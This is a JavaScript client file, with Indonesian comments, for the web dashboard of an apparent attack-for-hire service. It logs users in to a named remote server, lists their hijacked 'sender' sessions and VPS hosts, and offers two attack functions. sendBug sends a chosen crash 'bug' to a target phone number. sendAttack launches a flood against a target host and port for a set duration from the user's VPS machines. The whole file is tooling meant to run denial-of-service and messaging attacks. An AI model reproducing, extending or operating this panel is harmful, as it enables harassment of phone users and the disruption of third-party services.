// ===== KONFIGURASI =====
// GANTI DENGAN DOMAIN ATAU IP SERVER LO!
const API_BASE = 'http://zanspiwcloud.panelpublic.my.id:6050'; // ← GANTI INI

let sessionKey = null;

// ===== FUNGSI GET API BASE =====
function getApiBase() {
  const saved = localStorage.getItem('apiBase');
  if (saved) return saved;
  if (window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1') {
    return 'http://localhost:4004';
  }
  return API_BASE;
}

// ===== CEK KONEKSI SERVER =====
async function checkServer() {
  try {
    const res = await fetch(`${getApiBase()}/ping`); // ← UDAH PAKE getApiBase()
    if (res.ok) {
      const statusEl = document.getElementById('serverStatus');
      if (statusEl) {
        statusEl.textContent = '✅ Server online';
        statusEl.style.color = '#1DE9B6';
      }
      const badgeEl = document.getElementById('serverBadge');
      if (badgeEl) badgeEl.textContent = '🟢 Online';
    }
  } catch (e) {
    const statusEl = document.getElementById('serverStatus');
    if (statusEl) {
      statusEl.textContent = '❌ Server offline (cek API Base)';
      statusEl.style.color = '#EF4444';
    }
    const badgeEl = document.getElementById('serverBadge');
    if (badgeEl) badgeEl.textContent = '🔴 Offline';
  }
}

// ===== INIT =====
document.addEventListener('DOMContentLoaded', () => {
  // ---- LOGIN ----
  const loginForm = document.getElementById('loginForm');
  if (loginForm) {
    const apiInput = document.getElementById('apiBaseInput');
    if (apiInput) {
      apiInput.value = getApiBase();
    }
    
    const saveBtn = document.getElementById('saveApiBtn');
    if (saveBtn) {
      saveBtn.addEventListener('click', () => {
        const url = document.getElementById('apiBaseInput').value.trim();
        if (url) {
          localStorage.setItem('apiBase', url);
          const status = document.getElementById('apiStatus');
          if (status) {
            status.textContent = '✅ Tersimpan!';
            status.style.color = '#1DE9B6';
            setTimeout(() => { status.textContent = ''; }, 2000);
          }
          checkServer();
        }
      });
    }
    
    loginForm.addEventListener('submit', async (e) => {
      e.preventDefault();
      const username = document.getElementById('username').value.trim();
      const password = document.getElementById('password').value.trim();
      const androidId = localStorage.getItem('androidId') || 'web_' + Date.now();
      localStorage.setItem('androidId', androidId);
      
      const apiBase = getApiBase();

      try {
        const res = await fetch(`${apiBase}/validate`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ username, password, version: '3.0', androidId })
        });
        const data = await res.json();

        if (data.valid && !data.expired) {
          sessionKey = data.key;
          localStorage.setItem('sessionKey', sessionKey);
          localStorage.setItem('username', username);
          window.location.href = 'dashboard.html';
        } else {
          const msg = document.getElementById('loginMessage');
          msg.textContent = data.expired ? '⏳ Akun sudah expired!' : '❌ Username atau password salah!';
          msg.classList.remove('hidden');
        }
      } catch (err) {
        const msg = document.getElementById('loginMessage');
        msg.textContent = '❌ Gagal konek ke server! Cek API Base.';
        msg.classList.remove('hidden');
      }
    });
  }

  // ---- DASHBOARD ----
  if (window.location.pathname.includes('dashboard.html')) {
    sessionKey = localStorage.getItem('sessionKey');
    const username = localStorage.getItem('username');

    if (!sessionKey || !username) {
      window.location.href = 'login.html';
      return;
    }

    const nameEl = document.getElementById('usernameDisplay');
    if (nameEl) nameEl.textContent = username;
    
    checkServer();
    loadUserInfo();
    loadSenders();
    loadVPS();
    loadGlobalQuota();

    const bugBtn = document.getElementById('sendBugBtn');
    if (bugBtn) bugBtn.addEventListener('click', sendBug);
    
    const attackBtn = document.getElementById('sendAttackBtn');
    if (attackBtn) attackBtn.addEventListener('click', sendAttack);
    
    const logoutBtn = document.getElementById('logoutBtn');
    if (logoutBtn) {
      logoutBtn.addEventListener('click', () => {
        localStorage.clear();
        window.location.href = 'login.html';
      });
    }
  }
});

// ===== API CALLS =====
async function loadUserInfo() {
  try {
    const res = await fetch(
      `${getApiBase()}/myInfo?username=${localStorage.getItem('username')}&password=dummy&androidId=${localStorage.getItem('androidId')}&key=${sessionKey}`
    );
    const data = await res.json();
    if (data.valid && !data.expired) {
      const roleEl = document.getElementById('roleDisplay');
      if (roleEl) roleEl.textContent = data.role || 'member';
      
      const expEl = document.getElementById('expiredDisplay');
      if (expEl) expEl.textContent = data.expiredDate || '∞';
      
      const tgEl = document.getElementById('telegramDisplay');
      if (tgEl) tgEl.textContent = data.telegramId || '-';
    }
  } catch (e) {
    console.error('loadUserInfo error:', e);
  }
}

async function loadSenders() {
  try {
    const res = await fetch(`${getApiBase()}/mySender?key=${sessionKey}`);
    const data = await res.json();
    const container = document.getElementById('senderList');

    if (container) {
      if (data.connections?.length) {
        container.innerHTML = data.connections
          .map(s => `<div>${s.sessionName} ${s.isGlobal ? '🌍' : '🔒'}</div>`)
          .join('');
      } else {
        container.innerHTML = '<div style="color:#64748b;">Tidak ada sender aktif.</div>';
      }
    }
  } catch (e) {
    console.error('loadSenders error:', e);
  }
}

async function loadVPS() {
  try {
    const res = await fetch(`${getApiBase()}/myServer?key=${sessionKey}`);
    const data = await res.json();
    const container = document.getElementById('vpsList');

    if (container) {
      if (Array.isArray(data) && data.length) {
        container.innerHTML = data.map(v => `<div>🖥️ ${v.host} (${v.username})</div>`).join('');
      } else {
        container.innerHTML = '<div style="color:#64748b;">Tidak ada VPS terdaftar.</div>';
      }
    }
  } catch (e) {
    console.error('loadVPS error:', e);
  }
}

async function loadGlobalQuota() {
  try {
    const res = await fetch(`${getApiBase()}/mySender?key=${sessionKey}`);
    const data = await res.json();
    const quota = data.globalSenderQuota || {};
    const text = quota.unlimited
      ? '🌍 Unlimited (Global Sender)'
      : `🌍 ${quota.used || 0} / ${quota.limit || 0} (${quota.remaining || 0} tersisa)`;
    
    const el = document.getElementById('globalQuotaText');
    if (el) el.textContent = text;
  } catch (e) {
    console.error('loadGlobalQuota error:', e);
  }
}

// ===== SEND BUG =====
async function sendBug() {
  const target = document.getElementById('bugTarget')?.value.trim();
  const bug = document.getElementById('bugType')?.value;
  const status = document.getElementById('bugStatus');

  if (!target) {
    if (status) status.textContent = '❌ Masukkan nomor target!';
    return;
  }
  if (status) status.textContent = '⏳ Mengirim...';

  try {
    const res = await fetch(
      `${getApiBase()}/sendBug?key=${sessionKey}&bug=${bug}&target=${target}&senderType=private`
    );
    const data = await res.json();

    if (status) {
      if (data.valid && data.sended) {
        status.textContent = `✅ Bug ${bug} terkirim ke ${target}`;
        status.style.color = '#1DE9B6';
      } else if (data.cooldown) {
        status.textContent = `⏳ Cooldown ${data.wait} detik lagi.`;
        status.style.color = '#F59E0B';
      } else {
        status.textContent = `❌ ${data.message || 'Gagal kirim bug.'}`;
        status.style.color = '#EF4444';
      }
    }
  } catch (e) {
    if (status) {
      status.textContent = '❌ Error: ' + e.message;
      status.style.color = '#EF4444';
    }
  }
}

// ===== SEND ATTACK =====
async function sendAttack() {
  const target = document.getElementById('attackTarget')?.value.trim();
  const port = document.getElementById('attackPort')?.value.trim();
  const duration = document.getElementById('attackDuration')?.value.trim();

  if (!target || !port || !duration) {
    return alert('Isi semua field!');
  }

  try {
    const res = await fetch(`${getApiBase()}/sendCommand`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ key: sessionKey, target, port, duration })
    });
    const data = await res.json();
    alert(data.success ? `✅ Attack diluncurkan ke ${data.userVPSCount || 0} VPS` : '❌ Gagal luncurkan attack');
  } catch (e) {
    alert('Error: ' + e.message);
  }
}

// ===== SIMPAN API BASE =====
function saveApiBase() {
  const url = document.getElementById('apiBaseInput')?.value.trim();
  if (url) {
    localStorage.setItem('apiBase', url);
    const status = document.getElementById('apiStatus');
    if (status) {
      status.textContent = '✅ Tersimpan!';
      status.style.color = '#1DE9B6';
      setTimeout(() => { status.textContent = ''; }, 2000);
    }
    checkServer();
  }
}
